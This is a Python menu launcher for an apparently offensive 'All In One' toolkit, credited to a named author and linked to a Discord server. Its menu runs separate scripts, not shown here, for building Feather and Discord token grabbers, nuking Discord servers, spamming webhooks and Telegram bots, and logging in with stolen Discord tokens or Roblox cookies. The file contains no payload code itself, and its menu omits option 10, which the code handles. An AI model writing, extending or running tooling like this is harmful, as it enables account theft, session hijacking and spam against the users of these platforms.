import os
import time

banner = r"""
  ______   __  __        ______                   ______                             
 /      \ |  \|  \      |      \                 /      \                            
|  $$$$$$\| $$| $$       \$$$$$$ _______        |  $$$$$$\ _______    ______        
| $$__| $$| $$| $$        | $$  |       \       | $$  | $$|       \  /      \       
| $$    $$| $$| $$        | $$  | $$$$$$$\      | $$  | $$| $$$$$$$\|  $$$$$$\      
| $$$$$$$$| $$| $$        | $$  | $$  | $$      | $$  | $$| $$  | $$| $$    $$      
| $$  | $$| $$| $$       _| $$_ | $$  | $$      | $$__/ $$| $$  | $$| $$$$$$$$      
| $$  | $$| $$| $$      |   $$ \| $$  | $$       \$$    $$| $$  | $$ \$$     \      
 \$$   \$$ \$$ \$$       \$$$$$$ \$$   \$$        \$$$$$$  \$$   \$$  \$$$$$$$   
   
                        https://discord.gg/2mzUuwScaZ                                                            
"""
menu1 = r"""
┌──────────────────────────────────────────────────────────────────────────────────┐
│ [01] Feather Account Grabber  [08] Discord Token Grabber                         │
│ [02] Discord Nuker            [09] Discord Webhook Spammer                       │
│ [03] Telegram Bot Deletor     [11] Discord Token Checker                         │
│ [04] Telegram Bot Spammer     [12] Roblox Cookie Login                           │
│ [05] Telegram Bot Validator   [13] Base64 encode                                 │
│ [06] Discord Token Login      [14] Base64 decode                                 │
│ [07] Discord Token Info       [15] Ip lookup                                     │
└──────────────────────────────────────────────────────────────────────────────────┘
"""

credits = r"""
                   [!] Made by @DevQueen__ [!]
"""

while True:
    os.system('cls' if os.name == 'nt' else 'clear')
    print(banner)
    print(menu1)
    print(credits)

    choice = input("\nEnter choice: ").strip()
    
    if choice == "1":
        os.system("cd src/FeatherAccountGrabber && python builder.py")
    elif choice == "2":
        os.system("python src/Nuker/Nuker.py")
    elif choice == "3":
        os.system("python src/Telegram/DeleteBot.py")
    elif choice == "4":
        os.system("python src/Telegram/SpamBot.py")
    elif choice == "5":
        os.system("python src/Telegram/validate_bot.py")
    elif choice == "6":
        os.system("python src/Discord/token_login.py")
    elif choice == "7":
        os.system("python src/Discord/Token_Info.py")
    elif choice == "8":
        os.system("cd src/DiscordTokenGrabber && python builder.py")
    elif choice == "9":
        os.system("python src/Discord/Webhook_Spammer.py")
    elif choice == "10":
        os.system("python src/Discord/DeleteWebhook.py")
    elif choice == "11":
        os.system("python src/discord/TokenChcker.py")
    elif choice == "12":
        os.system("python src/Roblox/CookieLogin.py")
    elif choice == "13":
        os.system("python src/Another/base64_encode.py")
    elif choice == "14":
        os.system("python src/Another/base64_decode.py")
    elif choice == "15":
        os.system("python src/Ip/ip_lookup.py")
    else:
        print("Invalid choice. Please try again.")
        
    time.sleep(1)
    input("\n[!] Press Enter to return to the menu...")